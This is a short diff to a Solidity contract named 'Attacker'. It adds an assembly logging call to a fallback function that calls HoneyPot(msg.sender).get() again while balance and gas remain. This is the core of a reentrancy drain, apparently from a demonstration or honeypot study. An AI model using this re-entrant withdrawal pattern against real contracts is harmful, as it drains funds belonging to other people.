@@ -12,6 +12,10 @@ contract Attacker {
     }
 
     function() payable {
+        assembly {
+            // The cheapest logging I could think of.
+            log0(0, 0)
+        }
         if (msg.sender.balance >= msg.value && msg.gas >= 20000) {
             HoneyPot(msg.sender).get();
         }
